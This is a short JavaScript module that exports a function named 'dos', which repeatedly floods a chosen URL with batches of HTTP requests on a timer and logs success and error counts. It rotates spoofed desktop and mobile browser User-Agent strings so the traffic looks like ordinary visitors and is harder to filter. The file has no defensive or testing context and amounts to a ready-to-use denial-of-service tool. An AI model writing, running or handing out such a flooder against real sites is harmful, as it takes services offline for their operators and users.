const request = require('request');

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
];

const dos = (url, qty, ms) => {
    let err = 0, ok = 0;
    let counter = 1;

    setInterval(() => {
        for (let i = 0; i < qty; i++) {
            const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
            const options = {
                url: url,
                headers: {
                    'User-Agent': userAgent
                }
            };

            request(options, error => {
                if (error) {
                    err++;
                } else {
                    ok++;
                }
            });
        }
        console.log(`${counter}: ${url} OK: ${ok} ERR: ${err}`);
        counter++;
        err = ok = 0;
    }, ms);
};

module.exports = dos;
